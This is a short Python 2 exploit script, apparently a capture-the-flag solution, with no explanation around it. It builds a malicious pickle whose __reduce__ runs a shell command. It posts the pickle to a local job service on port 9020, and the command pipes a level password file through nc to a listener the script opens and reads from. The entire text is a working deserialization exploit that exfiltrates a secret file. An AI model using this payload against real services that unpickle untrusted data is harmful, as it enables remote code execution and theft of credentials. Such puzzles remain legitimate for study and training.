#!/usr/bin/env python
# Thanks to Evan Broder <evan@ebroder.net>
import pickle
import subprocess
import urllib
import socket

class Gimme(object):
   def __reduce__(self):
       return (subprocess.Popen,
               (('/bin/sh', '-c',
                 'nc localhost 41803 </home/level06/.password'),))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('localhost', 41803))
s.listen(1)
urllib.urlopen('http://localhost:9020', '; job: ' + pickle.dumps(Gimme()))
c, _ = s.accept()
print c.recv(1024)
